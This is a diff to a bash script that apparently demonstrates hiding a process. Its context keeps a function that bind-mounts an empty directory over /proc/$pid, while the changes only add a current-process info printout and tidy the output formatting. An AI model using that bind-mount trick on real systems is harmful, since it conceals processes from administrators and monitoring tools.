@@ -40,7 +40,11 @@ function hideProcess() {
         mount --bind /tmp/hidden /proc/$pid
 }
 function listProcess() {
-        ps -efa -o ppid,pid,tty,comm ; printf "\n"
+        ps -efa -o ppid,pid,tty,comm
+}
+function currentProcinfo() {
+	printf "\n\nCurrent Process Info\n\n"
+	printf "PPID=$PPID PID=$$ TTY=";tty
 }
 
 if [[ $(id -u) -ne "0" ]]; then
@@ -54,6 +58,7 @@ do
         ProgressBar ${number} ${_end}
 done
 
+currentProcinfo
 printf "\nSimple Process List\n\n"
 listProcess
 printf "\r\n"
@@ -67,4 +72,4 @@ for i in $(seq 1 ${#mesg}); do
         printf "${mesg:i-1:1}"
         sleep 0.022
 done
-echo -ne "\n"
+printf "\n\n"
